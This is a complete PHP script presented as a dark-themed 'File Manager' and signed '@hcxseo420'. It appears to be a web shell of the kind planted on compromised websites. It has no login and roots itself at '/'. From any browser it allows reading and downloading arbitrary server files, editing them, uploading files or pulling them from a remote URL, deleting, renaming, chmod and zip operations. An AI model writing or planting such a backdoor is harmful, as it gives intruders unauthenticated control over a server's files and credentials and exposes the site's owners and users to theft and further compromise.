<?php
// ===== TOP: logic & helpers (no output before this) =====
declare(strict_types=1);

// (opsional) pakai TZ tertentu:
// date_default_timezone_set('Asia/Jakarta');

$root = '/';
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path) || strpos($path, $root) !== 0) $path = getcwd();

function safe_path($p){ return htmlspecialchars((string)$p, ENT_QUOTES); }
function relative_path($abs){ return $abs ?: '/'; }
function format_size($bytes){
  $u=['B','KB','MB','GB','TB']; $i=0;
  while($bytes>=1024 && $i<count($u)-1){ $bytes/=1024; $i++; }
  return round($bytes,2).' '.$u[$i];
}
function format_date($ts){ return $ts ? date('Y-m-d H:i:s', (int)$ts) : '-'; } // TZ server
function get_perm($f){ return sprintf('%04o', @fileperms($f) & 0x0FFF); }
function get_user_group($f){
  $uid = @fileowner($f); $gid = @filegroup($f);
  $user = ($uid!==false && function_exists('posix_getpwuid')) ? (posix_getpwuid($uid)['name'] ?? $uid) : $uid;
  $grp  = ($gid!==false && function_exists('posix_getgrgid')) ? (posix_getgrgid($gid)['name'] ?? $gid) : $gid;
  if ($user===false) $user='?'; if ($grp===false) $grp='?';
  return $user.':'.$grp;
}
function redirect_msg(string $p, string $msg, string $type='info'){
  $q = http_build_query(['path'=>$p, 'msg'=>$msg, 'type'=>$type]);
  header("Location:?$q"); exit;
}
function unique_path(string $p): string{
  if (!file_exists($p)) return $p;
  $dir = dirname($p);
  $base = pathinfo($p, PATHINFO_FILENAME);
  $ext  = pathinfo($p, PATHINFO_EXTENSION);
  $i=1; do{
    $cand = $dir.DIRECTORY_SEPARATOR.$base.'_'.$i.($ext?'.'.$ext:'');
    $i++;
  } while(file_exists($cand));
  return $cand;
}

// ======= server clock info (agar jam pojok == waktu server) =======
$serverNow    = time();                              // epoch detik di server (UTC basis)
$serverTzName = date_default_timezone_get();         // nama TZ server
$serverOffset = (new DateTime('now'))->getOffset();  // offset detik dari UTC (+/-)
function tz_offset_hm(int $sec){
  $sign = $sec>=0 ? '+' : '-'; $sec = abs($sec);
  $h = str_pad((string)intdiv($sec,3600),2,'0',STR_PAD_LEFT);
  $m = str_pad((string)intdiv($sec%3600,60),2,'0',STR_PAD_LEFT);
  return "UTC{$sign}{$h}:{$m}";
}

// ===== ZIP helpers =====
function zip_create(string $source, string $zipPath): bool{
  if (!class_exists('ZipArchive')) return false;
  $zip = new ZipArchive();
  if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)!==true) return false;

  $source = rtrim($source, DIRECTORY_SEPARATOR);
  $zipReal = realpath($zipPath) ?: $zipPath;

  if (is_dir($source)) {
    $rootName = basename($source);
    if ($rootName==='') $rootName='root';
    $zip->addEmptyDir($rootName);

    $it = new RecursiveIteratorIterator(
      new RecursiveDirectoryIterator($source, FilesystemIterator::SKIP_DOTS),
      RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($it as $fsInfo) {
      $fp = $fsInfo->getPathname();
      // hindari mengarsip file zip output jika berada di dalam source
      if (realpath($fp) === $zipReal) continue;

      $local = $rootName . DIRECTORY_SEPARATOR . ltrim(str_replace($source, '', $fp), DIRECTORY_SEPARATOR);
      if ($fsInfo->isDir()) $zip->addEmptyDir($local);
      else $zip->addFile($fp, $local);
    }
  } else {
    $zip->addFile($source, basename($source));
  }
  return $zip->close();
}
function zip_extract_to_folder(string $zipFile, string $targetDir): bool{
  if (!class_exists('ZipArchive')) return false;
  $zip = new ZipArchive();
  if ($zip->open($zipFile)!==true) return false;
  if (!is_dir($targetDir)) @mkdir($targetDir, 0755);
  $ok = $zip->extractTo($targetDir);
  $zip->close();
  return $ok;
}

// ===== Actions (early exit) =====

// Download
if (isset($_GET['download'])) {
  $file = realpath($_GET['download']);
  if ($file && strpos($file,$root)===0 && is_file($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Content-Length: '.filesize($file));
    readfile($file); exit;
  }
  http_response_code(403); header('Content-Type: text/plain; charset=utf-8');
  echo "Download not allowed."; exit;
}

// Serve content untuk editor
if (isset($_GET['edit'])) {
  $file = realpath($_GET['edit']);
  if ($file && strpos($file,$root)===0 && is_file($file)) {
    header('Content-Type: text/plain; charset=utf-8');
    readfile($file); exit;
  }
  http_response_code(403); header('Content-Type: text/plain; charset=utf-8');
  echo "Access denied"; exit;
}

// Create
if (isset($_POST['create_type'], $_POST['create_name'])) {
  $name = basename($_POST['create_name']);
  $t = $path.DIRECTORY_SEPARATOR.$name;
  $ok = false;
  if (is_dir($path)) {
    if ($_POST['create_type']==='folder' && !file_exists($t)) $ok = @mkdir($t,0755);
    if ($_POST['create_type']==='file' && !file_exists($t)) $ok = (@file_put_contents($t,'')!==false);
  }
  redirect_msg($path, $ok? "Berhasil membuat {$_POST['create_type']} '$name'." : "Gagal membuat '{$_POST['create_type']}' '$name'.", $ok?'success':'error');
}

// Rename
if (isset($_POST['rename_old'], $_POST['rename_new'])) {
  $old = realpath($path.DIRECTORY_SEPARATOR.$_POST['rename_old']);
  $newName = basename($_POST['rename_new']);
  $new = $path.DIRECTORY_SEPARATOR.$newName;
  $ok = false;
  if ($old && strpos($old,$root)===0) $ok = @rename($old,$new);
  redirect_msg($path, $ok? "Berhasil rename ke '$newName'." : "Gagal rename.", $ok?'success':'error');
}

// Save Edit
if (isset($_POST['edit_file'], $_POST['content'])) {
  $f = realpath($_POST['edit_file']);
  $ok = false;
  if ($f && strpos($f,$root)===0) $ok = (@file_put_contents($f, $_POST['content'])!==false);
  $back = dirname($f?:$path);
  redirect_msg($back, $ok? "Berhasil menyimpan '".basename($f)."'.": "Gagal menyimpan file.", $ok?'success':'error');
}

// Upload lokal
if (!empty($_FILES['upload']['tmp_name']) && $_FILES['upload']['error']===UPLOAD_ERR_OK) {
  $t = $path.DIRECTORY_SEPARATOR.basename($_FILES['upload']['name']);
  $ok = @move_uploaded_file($_FILES['upload']['tmp_name'],$t);
  redirect_msg($path, $ok? "Upload berhasil: '".basename($t)."'." : "Upload gagal.", $ok?'success':'error');
}

// Upload dari URL
if (!empty($_POST['remote_url'])) {
  $url = $_POST['remote_url'];
  $fn  = basename(parse_url($url, PHP_URL_PATH) ?? '') ?: 'remote_'.time();
  $t   = $path.DIRECTORY_SEPARATOR.$fn;
  $c = @file_get_contents($url);
  $ok = false;
  if ($c!==false) $ok = (@file_put_contents($t,$c)!==false);
  redirect_msg($path, $ok? "Ambil dari URL berhasil: '$fn'." : "Gagal ambil dari URL.", $ok?'success':'error');
}

// Delete
if (isset($_GET['delete'])) {
  $targetName = $_GET['delete'];
  $t = realpath($path.DIRECTORY_SEPARATOR.$targetName);
  $ok = false;
  if ($t && strpos($t,$root)===0) { $ok = is_dir($t)? @rmdir($t) : @unlink($t); }
  redirect_msg($path, $ok? "Berhasil hapus '$targetName'." : "Gagal hapus '$targetName'.", $ok?'success':'error');
}

// Change Permission (chmod)
if (isset($_POST['chmod_target'], $_POST['chmod_mode'])) {
  $target = realpath($_POST['chmod_target']);
  $modeIn = trim($_POST['chmod_mode']);
  $ok = false; $msg = "Gagal mengubah permission.";
  if ($target && strpos($target,$root)===0 && preg_match('/^[0-7]{3,4}$/', $modeIn)) {
    $oct = strlen($modeIn)===3 ? '0'.$modeIn : $modeIn;
    $ok = @chmod($target, octdec($oct));
    $now = $ok ? get_perm($target) : $modeIn;
    $msg = $ok ? "Permission '".basename($target)."' diubah ke $now." : "Gagal chmod ke $modeIn.";
  }
  redirect_msg($path, $msg, $ok?'success':'error');
}

// ZIP: zip current directory (toolbar)
if (isset($_GET['zipdir'])) {
  $base = basename($path); if ($base==='') $base='root';
  $zipPath = unique_path($path.DIRECTORY_SEPARATOR.$base.'.zip');
  $ok = zip_create($path, $zipPath);
  $msg = $ok ? "Kompres folder ini → '".basename($zipPath)."'." : "Gagal kompres folder ini. (ZipArchive?)";
  redirect_msg($path, $msg, $ok?'success':'error');
}

// UNZIP (toolbar, pilih file .zip di folder ini)
if (isset($_GET['unzip'])) {
  $name = basename($_GET['unzip']);
  $zipf = realpath($path.DIRECTORY_SEPARATOR.$name);
  $ok=false;
  if ($zipf && strpos($zipf,$root)===0 && is_file($zipf) && preg_match('/\.zip$/i',$zipf)) {
    $target = unique_path($path.DIRECTORY_SEPARATOR.pathinfo($zipf, PATHINFO_FILENAME));
    $ok = zip_extract_to_folder($zipf, $target);
    $msg = $ok ? "Unzip '$name' → '".basename($target)."/'." : "Gagal unzip '$name'.";
    redirect_msg($path, $msg, $ok?'success':'error');
  }
  if (isset($_GET['unzip']) && $_GET['unzip']==='') redirect_msg($path, "Pilih file .zip terlebih dahulu.", 'error');
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>File Manager</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #1e1e1e; color: #ddd; }
    a { color: #4da3ff; text-decoration: none; }
    table { width: 100%; border-collapse: collapse; background: #2c2c2c; table-layout: fixed; }
    th, td { padding: 10px; border-bottom: 1px solid #444; vertical-align: middle; }
    th { text-align: left; background: #252525; }
    tr:hover { background: #333; }
    .folder { font-weight: bold; }

    .modal {
      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.8); align-items: center; justify-content: center; z-index: 10;
    }
    .modal-content {
      background: #2c2c2c; padding: 20px; border-radius: 8px; width: 520px; color: #ddd;
      box-shadow: 0 10px 30px rgba(0,0,0,.5);
    }
    .modal textarea {
      width: 100%; height: 300px; font-family: monospace;
      background: #1e1e1e; color: #ccc; border: 1px solid #555;
    }
    input[type="text"], input[type="url"], input[type="file"], select, button {
      background: #1e1e1e; color: #ddd; border: 1px solid #555; padding: 6px 10px; border-radius: 6px;
    }
    button { margin-top: 10px; cursor: pointer; }
    .inline { display: inline-block; }

    /* Icons color */
    .fa-folder        { color: #f4d03f; }
    .fa-file          { color: #ecf0f1; }
    .fa-arrow-left    { color: #5dade2; }
    .fa-upload        { color: #58d68d; }
    .fa-globe         { color: #85c1e9; }
    .fa-pen, .fa-edit { color: #f39c12; }
    .fa-trash         { color: #e74c3c; }
    .fa-download      { color: #3498db; }
    .fa-plus          { color: #ffffff; }
    .fa-folder-open   { color: #f7dc6f; }
    .fa-file-zipper   { color: #f1c40f; }
    .fa-box-open      { color: #58d68d; }

    /* Alert */
    .alert {
      border-radius: 8px; padding: 10px 14px; margin: 10px 0 16px;
      display: flex; align-items: center; gap: 10px;
    }
    .alert-success { background:#0e3b1e; border:1px solid #1f8a49; color:#b7ffd3; }
    .alert-error   { background:#3b0e0e; border:1px solid #b44141; color:#ffd2d2; }
    .alert-info    { background:#0e213b; border:1px solid #4177b4; color:#cfe4ff; }
    .alert .close  { margin-left:auto; cursor:pointer; opacity:.8; }

    /* Layout widths: Name / Date / Size / User / Perm / Actions => total 100% */
    .col-name { width: 36%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .col-date { width: 19%; }
    .col-size { width: 10%; text-align: right; }
    .col-user { width: 22%; white-space: normal; overflow-wrap: anywhere; }
    .col-perm { width: 7%;  text-align: center; font-family: monospace; }
    .col-acts { width: 6%;  text-align: right; }
    .perm-btn { cursor: pointer; padding: 2px 6px; border-radius: 4px; border: 1px dashed #666; }
    .perm-btn:hover { background:#1b1b1b; }
    .tag { font-family: monospace; }

    /* Server clock */
    .server-clock {
      position: fixed; top: 8px; right: 20px; z-index: 20;
      background:#0e213b; border:1px solid #4177b4; color:#cfe4ff;
      padding:6px 10px; border-radius:8px; font-variant-numeric: tabular-nums;
      box-shadow: 0 6px 18px rgba(0,0,0,.35);
    }
  </style>
</head>
<body>

  <!-- Jam server (bukan browser) -->
  <div class="server-clock">
    <i class="fa fa-clock"></i>
    <span id="serverClock">--:--:--</span>
    <small style="opacity:.75">
      (<?= safe_path($serverTzName) ?> / <?= tz_offset_hm($serverOffset) ?>)
    </small>
  </div>

  <h2 style="margin-top:32px;"><i class="fa fa-folder-open"></i> File Manager – <?= safe_path(relative_path($path)) ?></h2>

  <?php if (!empty($_GET['msg'])):
    $type = $_GET['type'] ?? 'info';
    $cls = 'alert-info';
    if ($type==='success') $cls='alert-success';
    elseif ($type==='error') $cls='alert-error';
  ?>
    <div id="flash" class="alert <?=$cls?>">
      <i class="fa <?= $type==='success'?'fa-check-circle':($type==='error'?'fa-times-circle':'fa-info-circle') ?>"></i>
      <span><?= safe_path($_GET['msg']) ?></span>
      <span class="close" onclick="dismissFlash()">✕</span>
    </div>
  <?php endif; ?>

  <p style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
    <?php if ($path !== $root): ?>
      <a href="?path=<?=urlencode(dirname($path))?>"><i class="fa fa-arrow-left"></i> Kembali</a>
    <?php endif; ?>
    <form method="post" enctype="multipart/form-data" class="inline">
      <label><i class="fa fa-upload"></i> Upload: <input type="file" name="upload" onchange="this.form.submit()"></label>
    </form>
    <form method="post" class="inline" style="display:flex;gap:8px;align-items:center;">
      <label><i class="fa fa-globe"></i> URL: <input type="url" name="remote_url" placeholder="https://…" required></label>
      <button><i class="fa fa-paper-plane"></i> Upload</button>
    </form>
    <span style="flex:1 1 0;"></span>
    <button onclick="openCreate('folder')"><i class="fa fa-folder"></i> Folder</button>
    <button onclick="openCreate('file')"><i class="fa fa-file"></i> File</button>
    <!-- Toolbar ZIP/UNZIP -->
    <a href="?path=<?=urlencode($path)?>&zipdir=1" onclick="return confirm('Zip seluruh isi folder ini?');" style="display:inline-block;padding:6px 10px;border:1px solid #555;border-radius:6px;text-decoration:none;"><i class="fa fa-file-zipper"></i> Zip</a>
    <button onclick="openUnzip()" title="Unzip file .zip di folder ini"><i class="fa fa-box-open"></i> Unzip</button>
  </p>

  <table>
    <tr>
      <th class="col-name">Nama</th>
      <th class="col-date">Date</th>
      <th class="col-size">Ukuran</th>
      <th class="col-user">User/Group</th>
      <th class="col-perm">Permission</th>
      <th class="col-acts">Aksi</th>
    </tr>
    <?php
      $items = @scandir($path) ?: [];
      $dirs=[]; $files=[];
      foreach($items as $i) if($i!=='.' && $i!=='..'){
        $full = realpath($path.DIRECTORY_SEPARATOR.$i);
        if(!$full) continue;
        if (is_dir($full)) $dirs[]=['n'=>$i,'f'=>$full];
        else $files[]=['n'=>$i,'f'=>$full];
      }

      // row render helper
      function row_dir($d,$path){
        $perm = get_perm($d['f']);
        $ug   = safe_path(get_user_group($d['f']));
        $name = safe_path($d['n']);
        $purl = urlencode($d['n']);
        $mtime = @filemtime($d['f']);
        echo "<tr>";
        echo "<td class='col-name folder'><i class='fa fa-folder'></i> <a href='?path=".urlencode($d['f'])."'>$name</a></td>";
        echo "<td class='col-date'>".format_date($mtime)."</td>";
        echo "<td class='col-size'>-</td>";
        echo "<td class='col-user' title='$ug'>$ug</td>";
        echo "<td class='col-perm'><span class='perm-btn tag' onclick=\"openPerm('".addslashes($d['f'])."','$perm')\">$perm</span></td>";
        echo "<td class='col-acts'>
                <a href='?path=".urlencode($path)."&delete=$purl' onclick='return confirm(\"Hapus folder?\")' title='Hapus'><i class='fa fa-trash'></i></a> |
                <a href='#' onclick=\"openRename('$name')\" title='Rename'><i class='fa fa-edit'></i></a>
              </td>";
        echo "</tr>";
      }
      function row_file($f,$path){
        $perm = get_perm($f['f']);
        $ug   = safe_path(get_user_group($f['f']));
        $name = safe_path($f['n']);
        $purl = urlencode($f['n']);
        $size = @filesize($f['f']); $size = $size===false? 0 : $size;
        $mtime = @filemtime($f['f']);
        echo "<tr>";
        echo "<td class='col-name'><i class='fa fa-file'></i> $name</td>";
        echo "<td class='col-date'>".format_date($mtime)."</td>";
        echo "<td class='col-size'>".format_size($size)."</td>";
        echo "<td class='col-user' title='$ug'>$ug</td>";
        echo "<td class='col-perm'><span class='perm-btn tag' onclick=\"openPerm('".addslashes($f['f'])."','$perm')\">$perm</span></td>";
        echo "<td class='col-acts'>
                <a href='#' onclick=\"openEdit('".addslashes($f['f'])."')\" title='Edit'><i class='fa fa-pen'></i></a> |
                <a href='?download=".urlencode($f['f'])."' title='Download'><i class='fa fa-download'></i></a> |
                <a href='?path=".urlencode($path)."&delete=$purl' onclick='return confirm(\"Hapus file?\")' title='Hapus'><i class='fa fa-trash'></i></a> |
                <a href='#' onclick=\"openRename('$name')\" title='Rename'><i class='fa fa-edit'></i></a>
              </td>";
        echo "</tr>";
      }

      foreach($dirs as $d)  row_dir($d,$path);
      foreach($files as $f) row_file($f,$path);

      // daftar zip untuk modal unzip
      $zipOptions = '';
      foreach ($files as $f) {
        if (preg_match('/\.zip$/i', $f['n'])) {
          $z = safe_path($f['n']);
          $zipOptions .= "<option value=\"{$z}\">{$z}</option>";
        }
      }
    ?>
  </table>

  <!-- Rename Modal -->
  <div id="modalRename" class="modal">
    <div class="modal-content">
      <h3><i class="fa fa-edit"></i> Rename</h3>
      <form method="post">
        <input type="hidden" name="rename_old" id="rename_old">
        <input type="text" name="rename_new" id="rename_new">
        <div style="margin-top:10px;display:flex;gap:10px;justify-content:flex-end">
          <button>Rename</button>
          <button type="button" onclick="closeModal('modalRename')">Batal</button>
        </div>
      </form>
    </div>
  </div>

  <!-- Edit Modal -->
  <div id="modalEdit" class="modal">
    <div class="modal-content">
      <h3><i class="fa fa-pen"></i> Edit File</h3>
      <form method="post">
        <textarea name="content" id="edit_content"></textarea>
        <input type="hidden" name="edit_file" id="edit_file">
        <div style="margin-top:10px;display:flex;gap:10px;justify-content:flex-end">
          <button>Simpan</button>
          <button type="button" onclick="closeModal('modalEdit')">Batal</button>
        </div>
      </form>
    </div>
  </div>

  <!-- Create Modal -->
  <div id="modalCreate" class="modal">
    <div class="modal-content">
      <h3 id="createTitle"><i class="fa fa-plus"></i> Buat</h3>
      <form method="post">
        <input type="text" name="create_name" id="create_name" placeholder="Nama">
        <input type="hidden" name="create_type" id="create_type">
        <div style="margin-top:10px;display:flex;gap:10px;justify-content:flex-end">
          <button>Buat</button>
          <button type="button" onclick="closeModal('modalCreate')">Batal</button>
        </div>
      </form>
    </div>
  </div>

  <!-- Unzip Modal -->
  <div id="modalUnzip" class="modal">
    <div class="modal-content">
      <h3><i class="fa fa-box-open"></i> Unzip File</h3>
      <form method="get">
        <input type="hidden" name="path" value="<?= safe_path($path) ?>">
        <?php if ($zipOptions): ?>
          <label>Pilih file .zip di folder ini:</label><br>
          <select name="unzip" style="min-width:300px"><?= $zipOptions ?></select>
          <div style="margin-top:10px;display:flex;gap:10px;justify-content:flex-end">
            <button>Unzip</button>
            <button type="button" onclick="closeModal('modalUnzip')">Batal</button>
          </div>
        <?php else: ?>
          <p style="margin:0 0 10px">Tidak ada file .zip di folder ini.</p>
          <div style="display:flex;gap:10px;justify-content:flex-end">
            <button type="button" onclick="closeModal('modalUnzip')">Tutup</button>
          </div>
        <?php endif; ?>
      </form>
    </div>
  </div>

  <!-- Permission Modal -->
  <div id="modalPerm" class="modal">
    <div class="modal-content">
      <h3><i class="fa fa-key"></i> Ubah Permission (chmod)</h3>
      <form method="post" onsubmit="return validatePerm();">
        <input type="hidden" name="chmod_target" id="chmod_target">
        <label>Warning : Jangan Sampai Salah Yaa</label><br>
        <input type="text" name="chmod_mode" id="chmod_mode" value="0755" pattern="[0-7]{3,4}" required>
        <div style="margin-top:10px;display:flex;gap:10px;justify-content:flex-end">
          <button>Simpan</button>
          <button type="button" onclick="closeModal('modalPerm')">Batal</button>
        </div>
      </form>
      <p style="opacity:.7; font-size:12px; margin-top:8px;">
        @hcxseo420
      </p>
    </div>
  </div>

  <script>
    function openRename(n){
      document.getElementById('rename_old').value = n;
      document.getElementById('rename_new').value = n;
      document.getElementById('modalRename').style.display = 'flex';
    }
    function openEdit(f){
      fetch('?edit='+encodeURIComponent(f))
        .then(r=>r.text())
        .then(t=>{
          document.getElementById('edit_content').value = t;
          document.getElementById('edit_file').value = f;
          document.getElementById('modalEdit').style.display = 'flex';
        });
    }
    function openCreate(type){
      document.getElementById('create_type').value = type;
      document.getElementById('createTitle').innerHTML =
        (type==='folder' ? "<i class='fa fa-folder'></i> Buat Folder" : "<i class='fa fa-file'></i> Buat File");
      document.getElementById('create_name').value = '';
      document.getElementById('modalCreate').style.display = 'flex';
    }
    function openPerm(fullPath,current){
      document.getElementById('chmod_target').value = fullPath; // path asli
      document.getElementById('chmod_mode').value = current;
      document.getElementById('modalPerm').style.display = 'flex';
    }
    function validatePerm(){
      const v = document.getElementById('chmod_mode').value.trim();
      if(!/^[0-7]{3,4}$/.test(v)){ alert('Masukkan mode oktal 3-4 digit, mis. 755 atau 0755'); return false; }
      return true;
    }
    function closeModal(id){ document.getElementById(id).style.display = 'none'; }
    function openUnzip(){ document.getElementById('modalUnzip').style.display = 'flex'; }

    // Tutup modal saat klik overlay
    document.querySelectorAll('.modal').forEach(m=>{
      m.addEventListener('click',e=>{ if(e.target===m) m.style.display='none'; });
    });
    // Flash helpers
    function dismissFlash(){ const f=document.getElementById('flash'); if(f) f.remove(); }
    window.addEventListener('load', ()=>{ const f=document.getElementById('flash'); if(f){ setTimeout(()=>{ if(f) f.remove(); }, 3000); }});

    // ==== Server Clock (zona waktu server, bukan browser) ====
    (function(){
      const baseUtcMs   = <?= (int)$serverNow ?> * 1000;  // epoch UTC dari server saat render
      const tzOffsetSec = <?= (int)$serverOffset ?>;      // offset zona server (detik)
      const clientStart = Date.now();
      const el = document.getElementById('serverClock');

      function pad(n){ return String(n).padStart(2,'0'); }
      function render(utcMs){
        const d = new Date(utcMs + tzOffsetSec*1000); // waktu lokal server
        const s = d.getUTCFullYear() + '-' + pad(d.getUTCMonth()+1) + '-' + pad(d.getUTCDate())
                + ' ' + pad(d.getUTCHours()) + ':' + pad(d.getUTCMinutes()) + ':' + pad(d.getUTCSeconds());
        if (el) el.textContent = s;
      }
      function tick(){ render(baseUtcMs + (Date.now() - clientStart)); }
      tick(); setInterval(tick, 1000);
    })();
  </script>
</body>
</html>
